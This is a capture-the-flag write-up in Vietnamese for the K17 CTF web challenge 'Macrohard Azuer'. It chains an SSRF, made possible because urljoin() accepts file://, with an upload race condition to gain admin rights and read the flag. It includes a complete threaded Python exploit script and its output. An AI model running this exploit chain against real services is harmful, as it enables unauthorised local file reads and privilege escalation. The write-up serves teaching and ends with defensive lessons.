# 🏴 Macrohard Azuer — K17 CTF Web Writeup

> **Challenge:** Macrohard Azuer  
> **Category:** Web  
> **Difficulty:** Medium  
> **Points:** 500  
> **Solves:** 1  
> **Flag:** `K17{why_s0_blu3?}`

---

## 📋 Mục lục

- [Tổng quan đề bài](#tổng-quan-đề-bài)
- [Phân tích kiến trúc hệ thống](#phân-tích-kiến-trúc-hệ-thống)
- [Phân tích mã nguồn](#phân-tích-mã-nguồn)
  - [Mục tiêu: Endpoint `/console/export`](#mục-tiêu-endpoint-consoleexport)
  - [Xác định lỗ hổng 1: SSRF via `urljoin()`](#xác-định-lỗ-hổng-1-ssrf-via-urljoin)
  - [Xác định lỗ hổng 2: Race condition trong `/upload`](#xác-định-lỗ-hổng-2-race-condition-trong-upload)
- [Xây dựng chuỗi khai thác](#xây-dựng-chuỗi-khai-thác)
  - [Phase 1: Bypass `elevated` — đạt quyền admin](#phase-1-bypass-elevated--đạt-quyền-admin)
  - [Phase 2: Bypass `export_enabled` — lấy flag](#phase-2-bypass-export_enabled--lấy-flag)
- [Exploit script](#exploit-script)
- [Kết quả](#kết-quả)
- [Tổng kết](#tổng-kết)

---

## Tổng quan đề bài

> *"more azure than azure – thats why we're azuer!"*

Đề bài cung cấp cho chúng ta:
- Một **Instantiator URL** để tạo instance challenge
- Một file **handout.zip** chứa toàn bộ source code

Giao diện web giả lập **Azure Portal** với chức năng quản lý tổ chức (Organisation console), cho phép tạo member, cấu hình compute allocation, import records, và export dữ liệu.

Flag nằm trong biến môi trường `FLAG` của server và chỉ được trả về qua endpoint `/console/export` khi thỏa mãn các điều kiện bảo vệ.

---

## Phân tích kiến trúc hệ thống

Từ file `docker-compose.yml`, hệ thống gồm 3 service:

```
┌─────────────┐     ┌──────────────────┐     ┌────────────────────┐
│   Gateway   │────▶│   url-parse      │────▶│  accounts.internal │
│  (socat)    │     │  (Flask app)     │     │  (stub API)        │
│  port 9999  │     │  port 8000       │     │  port 80           │
└─────────────┘     └──────────────────┘     └────────────────────┘
    edge network         backend network (internal)
```

**Điểm quan trọng:**
- **Gateway (socat):** Proxy đơn giản, forward traffic từ port 9999 (public) vào Flask app
- **url-parse (Flask):** Ứng dụng chính, chứa FLAG trong env, **không có internet access** (chỉ nằm trong backend network)
- **accounts.internal:** API stub nội bộ, **luôn luôn** trả về:

```json
{
    "role": "member",
    "export_enabled": false,
    "name": "member",
    "vcpu": 0,
    "quota": 0,
    "capacity": 0
}
```

> ⚠️ Vì `accounts.internal` luôn trả về `role: "member"` và `export_enabled: false`, nên theo flow bình thường, ta **không bao giờ** có thể lấy được flag.

---

## Phân tích mã nguồn

### Mục tiêu: Endpoint `/console/export`

Flag được trả về tại endpoint `/console/export` trong file `app.py`:

```python
@app.get("/console/export")
def console_export():
    if not session.get("elevated"):                    # ← Điều kiện 1
        return jsonify(error="not authorised"), 403

    account = session.get("account")
    if not account:
        return jsonify(error="no account selected"), 400

    base = urljoin(API_BASE, account)
    try:
        settings = fetch(base, "user/settings")        # ← Fetch từ URL
    except (OSError, ValueError):
        return jsonify(error="could not load account"), 502

    if not settings.get("export_enabled"):             # ← Điều kiện 2
        return jsonify(error="export not enabled for this account"), 403

    return jsonify(flag=FLAG)                          # ← 🏆 FLAG!
```

Để lấy flag, ta cần bypass **2 điều kiện**:

| # | Điều kiện | Giá trị cần đạt | Được set tại |
|---|-----------|-----------------|--------------|
| 1 | `session["elevated"]` | `True` | `/console/permissions` |
| 2 | `settings.get("export_enabled")` | `True` | Response từ `fetch()` |

### Phân tích flow `/console/permissions`

```python
API_BASE = os.environ.get("API_BASE", "https://accounts.internal/api/")

def fetch(base, resource):
    return json.load(urlopen(urljoin(base, resource), timeout=FETCH_TIMEOUT))

@app.get("/console/permissions")
def console_permissions():
    account = session.get("account")                   # ← User-controlled
    if not account:
        return jsonify(error="no account selected"), 400

    base = urljoin(API_BASE, account)                  # ← 🔥 Lỗ hổng ở đây
    try:
        permissions = fetch(base, "permissions")
    except (OSError, ValueError):
        return jsonify(error="could not load account"), 502
    session["elevated"] = permissions.get("role") == "admin"

    return jsonify(role=permissions.get("role"), elevated=session["elevated"])
```

Giá trị `account` được set qua endpoint `/console/select`:

```python
@app.post("/console/select")
def console_select():
    session["account"] = request.form.get("account", "")  # ← Hoàn toàn user-controlled
    return jsonify(account=session["account"])
```

**Chuỗi xử lý URL:**
1. `base = urljoin(API_BASE, account)` — API_BASE = `http://accounts.internal/api/`, account = user input
2. `fetch(base, "permissions")` → `urlopen(urljoin(base, "permissions"))`

---

### Xác định lỗ hổng 1: SSRF via `urljoin()`

`urljoin` trong Python xử lý URL theo chuẩn RFC — nếu tham số thứ 2 là **URL tuyệt đối** (có scheme), nó sẽ **thay thế hoàn toàn** URL gốc:

```python
>>> from urllib.parse import urljoin

# Bình thường: relative path
>>> urljoin("http://accounts.internal/api/", "alice")
'http://accounts.internal/api/alice'

# Tuyệt đối: THAY THẾ HOÀN TOÀN base!
>>> urljoin("http://accounts.internal/api/", "http://evil.com/")
'http://evil.com/'

# file:// protocol
>>> urljoin("http://accounts.internal/api/", "file:///tmp/users/attacker/")
'file:///tmp/users/attacker/'
```

Vì `account` do user kiểm soát hoàn toàn, nếu ta set `account = "file:///tmp/users/attacker/"`:

```python
base = urljoin("http://accounts.internal/api/", "file:///tmp/users/attacker/")
# → base = "file:///tmp/users/attacker/"

url = urljoin("file:///tmp/users/attacker/", "permissions")
# → url = "file:///tmp/users/attacker/permissions"
```

Server sẽ **đọc file local** `/tmp/users/attacker/permissions` thay vì gọi API internal! Đây là lỗ hổng **SSRF (Server-Side Request Forgery)** qua `file://` protocol.

> 💡 Tuy app không có internet access (backend network internal), nhưng `file://` protocol cho phép đọc file trên chính server — không cần kết nối mạng.

Nhưng vấn đề là: **file `/tmp/users/attacker/permissions` không tồn tại trên server**. Ta cần cách nào đó để ghi file lên server tại đường dẫn mong muốn.

---

### Xác định lỗ hổng 2: Race condition trong `/upload`

Endpoint `/upload` cho phép import records dưới dạng file JSON:

```python
STAGING_ROOT = "/tmp/users"

@app.post("/upload")
def upload():
    files = request.files.getlist("files")
    if len(files) > MAX_UPLOAD_FILES:        # Max 16 files
        return jsonify(error="too many files"), 400

    staged = []
    try:
        pending = []
        for storage in files:
            name = os.path.basename(storage.filename or "")
            if not name:
                continue

            raw = storage.read()
            if len(raw) > MAX_FILE_SIZE:     # Max 64KB per file
                raise ValidationError(f"{name}: file too large")
            record = json.loads(raw)         # Must be valid JSON

            account = record.get("account")
            if not isinstance(account, str) or not USERNAME_RE.match(account):
                raise ValidationError(...)

            dest_dir = os.path.join(STAGING_ROOT, account)
            os.makedirs(dest_dir, exist_ok=True)
            path = os.path.join(dest_dir, name)
            with open(path, "wb") as f:
                f.write(raw)                 # ← FILE ĐƯỢC GHI VÀO DISK
            staged.append((account, path))
            pending.append(record)

        for record in pending:
            apply_settings(record)           # ← Validate SAU KHI ghi file
    except ValidationError as exc:
        for _, path in staged:
            os.remove(path)                  # ← Xóa file nếu lỗi
        return jsonify(error=str(exc)), 400

    for _, path in staged:
        os.remove(path)                      # ← Xóa file nếu thành công
    return jsonify(imported=sorted({account for account, _ in staged}))
```

**Quan sát quan trọng:**

```
Timeline:  ──────────────────────────────────────────────▶
                 │                        │              │
           Ghi file lên disk      Validate records    Xóa file
                 │                        │              │
                 │◀──── RACE WINDOW ─────▶│              │
                 │    File tồn tại        │              │
                 │    trên disk!          │              │
```

Giữa thời điểm file **được ghi** (`f.write(raw)`) và thời điểm file **bị xóa** (`os.remove(path)`), file **tồn tại trên disk**. Vì Flask chạy với `threaded=True`, một request khác có thể đọc file này trong khoảng thời gian đó.

**Đường dẫn file được ghi:**
```
/tmp/users/{account}/{filename}
```

Ví dụ: upload file tên `permissions` với `account: "attacker"` → file ở `/tmp/users/attacker/permissions`

Đây chính xác là đường dẫn mà SSRF cần đọc! 🎯

---

## Xây dựng chuỗi khai thác

### Phase 1: Bypass `elevated` — đạt quyền admin

**Mục tiêu:** Làm cho `session["elevated"] = True`

**Phân tích URL chain:**
```python
account = "file:///tmp/users/attacker/"
base = urljoin(API_BASE, account)
# → base = "file:///tmp/users/attacker/"

url = urljoin(base, "permissions")
# → url = "file:///tmp/users/attacker/permissions"
```

Server sẽ đọc file `/tmp/users/attacker/permissions` và kiểm tra `permissions.get("role") == "admin"`.

**Các bước:**

1. **Select account:** POST `/console/select` với `account=file:///tmp/users/attacker/`

2. **Upload payload file:** POST `/upload` với file tên `permissions`, nội dung:
   ```json
   {
     "account": "attacker",
     "role": "admin",
     "vcpu": 1,
     "quota": 1,
     "capacity": 1
   }
   ```
   - `account: "attacker"` → match regex `^[A-Za-z0-9_-]{1,64}$` ✅
   - `role: "admin"` → giá trị ta cần server đọc được
   - `vcpu`, `quota`, `capacity` → numbers, pass `apply_settings()` validation ✅
   - File được ghi vào `/tmp/users/attacker/permissions` ✅

3. **Race condition:** Đồng thời gọi GET `/console/permissions` để đọc file trước khi nó bị xóa

```
Thread A (upload):     ──[write file]──[validate]──[delete file]──
Thread B (check):           ──────[GET /console/permissions]──────
                                       ↑
                              File exists! Race won! 🏆
```

**Tối ưu race condition:** Upload thêm **15 padding files** (~60KB mỗi file, valid JSON) để kéo dài thời gian server xử lý, mở rộng race window.

---

### Phase 2: Bypass `export_enabled` — lấy flag

**Mục tiêu:** Endpoint `/console/export` gọi `fetch(base, "user/settings")` và kiểm tra `settings.get("export_enabled")`.

**Phân tích URL chain:**
```python
account = "file:///tmp/users/"
base = urljoin(API_BASE, account)
# → base = "file:///tmp/users/"

url = urljoin(base, "user/settings")
# → url = "file:///tmp/users/user/settings"
```

Server sẽ đọc file `/tmp/users/user/settings`.

**Trick quan trọng:** Ta cần file ở đường dẫn `/tmp/users/user/settings`:
- Upload với `account: "user"`, filename `settings`
- `os.path.join("/tmp/users", "user")` → `/tmp/users/user/` (thư mục)
- `os.makedirs("/tmp/users/user/", exist_ok=True)` tạo thư mục
- File được ghi vào `/tmp/users/user/settings` ✅
- Account name `"user"` match regex `^[A-Za-z0-9_-]{1,64}$` ✅

**Các bước:**

1. **Select account mới:** POST `/console/select` với `account=file:///tmp/users/`

   > ⚠️ **Quan trọng:** Phải giữ nguyên session cookie từ Phase 1 (chứa `elevated=True`)! Nếu session bị reset, ta sẽ mất quyền elevated.

2. **Upload payload file:** POST `/upload` với file tên `settings`, nội dung:
   ```json
   {
     "account": "user",
     "export_enabled": true,
     "vcpu": 1,
     "quota": 1,
     "capacity": 1
   }
   ```

3. **Race condition:** Đồng thời gọi GET `/console/export` để đọc file trước khi bị xóa → nhận FLAG 🏆

---

## Exploit script

Script hoàn chỉnh sử dụng **chỉ Python standard library** (không cần pip install):

```python
#!/usr/bin/env python3
"""
Exploit for 'macrohard azuer' - K17 CTF Web Challenge
SSRF via urljoin() + Race condition on file upload
Uses ONLY Python standard library - no pip install needed!

Usage: python3 exploit.py <TARGET_URL>
"""

import sys, json, threading, uuid, ssl, time
from urllib.request import Request, urlopen
from urllib.parse import urlencode
from urllib.error import HTTPError

TARGET = sys.argv[1].rstrip("/")

# Skip SSL cert verification
ssl_ctx = ssl.create_default_context()
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE

SESSION_COOKIE = None

def update_session_cookie(resp):
    """Extract Flask session cookie from Set-Cookie header."""
    global SESSION_COOKIE
    for header in resp.headers.get_all("Set-Cookie") or []:
        part = header.split(";")[0].strip()
        if part.startswith("session="):
            SESSION_COOKIE = part

def do_request(method, path, body=None, headers=None):
    """Thread-safe HTTP request with manual cookie handling."""
    req = Request(f"{TARGET}{path}", data=body, method=method)
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)
    if SESSION_COOKIE:
        req.add_header("Cookie", SESSION_COOKIE)
    try:
        resp = urlopen(req, timeout=15, context=ssl_ctx)
        data = resp.read()
        update_session_cookie(resp)
        try:
            return json.loads(data), resp.status
        except json.JSONDecodeError:
            return {"raw": data.decode(errors='replace')[:200]}, resp.status
    except HTTPError as e:
        try:
            return json.loads(e.read()), e.code
        except Exception:
            return {"error": str(e)}, e.code
    except Exception as e:
        return {"error": str(e)}, 0

def build_multipart(files):
    """Build multipart/form-data body."""
    boundary = uuid.uuid4().hex
    parts = []
    for field, filename, content in files:
        parts.append(f"--{boundary}\r\n".encode())
        parts.append(
            f'Content-Disposition: form-data; name="{field}"; '
            f'filename="{filename}"\r\n'.encode()
        )
        parts.append(b"Content-Type: application/json\r\n\r\n")
        parts.append(content if isinstance(content, bytes) else content.encode())
        parts.append(b"\r\n")
    parts.append(f"--{boundary}--\r\n".encode())
    return f"multipart/form-data; boundary={boundary}", b"".join(parts)

# ─── Padding files (~60KB each) to widen race window ───
padding_files = []
for i in range(15):
    data = {"account": f"pad{i}", "vcpu": 1, "quota": 1,
            "capacity": 1, "pad": "A" * 58000}
    padding_files.append(("files", f"pad{i}.json", json.dumps(data).encode()))

# ═══════════════════════════════════════════════════════════
# PHASE 1: session["elevated"] = True
# ═══════════════════════════════════════════════════════════
print("[*] PHASE 1: Gaining elevated permissions")

body = urlencode({"account": "file:///tmp/users/attacker/"}).encode()
do_request("POST", "/console/select", body=body,
           headers={"Content-Type": "application/x-www-form-urlencoded"})

perms_payload = json.dumps({
    "account": "attacker", "role": "admin",
    "vcpu": 1, "quota": 1, "capacity": 1,
}).encode()

elevated = False
stop = threading.Event()

def upload_perms():
    while not stop.is_set():
        try:
            files = [("files", "permissions", perms_payload)] + padding_files
            ct, body = build_multipart(files)
            do_request("POST", "/upload", body=body, headers={"Content-Type": ct})
        except Exception:
            pass

def check_perms():
    global elevated
    while not stop.is_set():
        try:
            data, code = do_request("GET", "/console/permissions")
            if data.get("elevated"):
                elevated = True
                stop.set()
        except Exception:
            pass

for _ in range(4):
    threading.Thread(target=upload_perms, daemon=True).start()
time.sleep(0.3)
for _ in range(4):
    threading.Thread(target=check_perms, daemon=True).start()

start = time.time()
while not stop.is_set() and (time.time() - start) < 120:
    time.sleep(1)

if not elevated:
    print("[-] Race failed, try again")
    sys.exit(1)
print("[+] Got elevated!")

# ═══════════════════════════════════════════════════════════
# PHASE 2: export_enabled = True → FLAG
# ═══════════════════════════════════════════════════════════
print("[*] PHASE 2: Extracting flag")

body = urlencode({"account": "file:///tmp/users/"}).encode()
do_request("POST", "/console/select", body=body,
           headers={"Content-Type": "application/x-www-form-urlencoded"})

settings_payload = json.dumps({
    "account": "user", "export_enabled": True,
    "vcpu": 1, "quota": 1, "capacity": 1,
}).encode()

stop2 = threading.Event()
flag_value = None

def upload_settings():
    while not stop2.is_set():
        try:
            files = [("files", "settings", settings_payload)] + padding_files
            ct, body = build_multipart(files)
            do_request("POST", "/upload", body=body, headers={"Content-Type": ct})
        except Exception:
            pass

def check_export():
    global flag_value
    while not stop2.is_set():
        try:
            data, code = do_request("GET", "/console/export")
            if "flag" in data:
                flag_value = data["flag"]
                stop2.set()
        except Exception:
            pass

for _ in range(4):
    threading.Thread(target=upload_settings, daemon=True).start()
time.sleep(0.3)
for _ in range(4):
    threading.Thread(target=check_export, daemon=True).start()

start = time.time()
while not stop2.is_set() and (time.time() - start) < 120:
    time.sleep(1)

if flag_value:
    print(f"[🏆] FLAG: {flag_value}")
else:
    print("[-] Failed, try again")
```

---

## Kết quả

```
============================================================
[*] PHASE 1: Gaining elevated permissions
============================================================
[+] Selecting account = file:///tmp/users/attacker/
[+] Starting race (4 upload threads + 4 check threads)...
    [~] check=20 upload=8 code=502 resp={"error": "could not load account"}
    ...
    [~] check=400 upload=198 code=502 resp={"error": "could not load account"}

[!!!] GOT ELEVATED! (upload=199, check=402)
      Response: {'elevated': True, 'role': 'admin'}

============================================================
[*] PHASE 2: Extracting flag
============================================================
[+] Selecting account = file:///tmp/users/
[+] Starting race (4 upload + 4 check threads)...
    [~] check=20 upload=8 code=502 resp={"error": "could not load account"}
    ...
    [~] check=340 upload=164 code=502 resp={"error": "could not load account"}

[!!!] GOT FLAG! (upload=174, check=358)

============================================================
  🏆 FLAG: K17{why_s0_blu3?}
============================================================
```

---

## Tổng kết

### Vulnerability chain

```
┌─────────────────┐     ┌──────────────────────┐     ┌─────────────────┐
│  SSRF via        │     │  Race condition       │     │  Flag            │
│  urljoin()       │────▶│  trên /upload         │────▶│  extraction      │
│                  │     │                       │     │                  │
│  account =       │     │  File tồn tại tạm     │     │  /console/export │
│  file:///tmp/... │     │  trên disk            │     │  trả về FLAG     │
└─────────────────┘     └──────────────────────┘     └─────────────────┘
```

### Bảng tổng hợp lỗ hổng

| Lỗ hổng | Mô tả |
|---------|-------|
| **SSRF via `urljoin()`** | User-controlled `account` parameter với `file://` scheme khiến `urljoin()` thay thế hoàn toàn base URL, cho phép server đọc file local |
| **Race condition (TOCTOU)** | File được ghi tạm bởi `/upload` tồn tại trên disk trong khoảng thời gian ngắn trước khi bị xóa, cho phép SSRF đọc nội dung |
| **Kết hợp cả hai** | Upload file chứa `role: "admin"` / `export_enabled: true` → SSRF đọc file qua `file://` protocol → bypass cả 2 điều kiện bảo vệ → lấy FLAG |

### Bài học rút ra

1. **`urljoin()` có thể bị lạm dụng** khi tham số thứ 2 là user-controlled — luôn validate input (đặc biệt scheme) trước khi truyền vào
2. **Race condition (TOCTOU)** — dù file chỉ tồn tại tạm thời trên disk, khi server chạy multi-threaded thì vẫn có thể khai thác được
3. **Defense in depth** — không nên dựa vào một lớp bảo vệ duy nhất (internal network) mà cần validate cả protocol scheme của URL
4. **Atomic operations** — nên validate trước khi ghi file, hoặc ghi vào temp directory riêng biệt rồi mới move sang staging
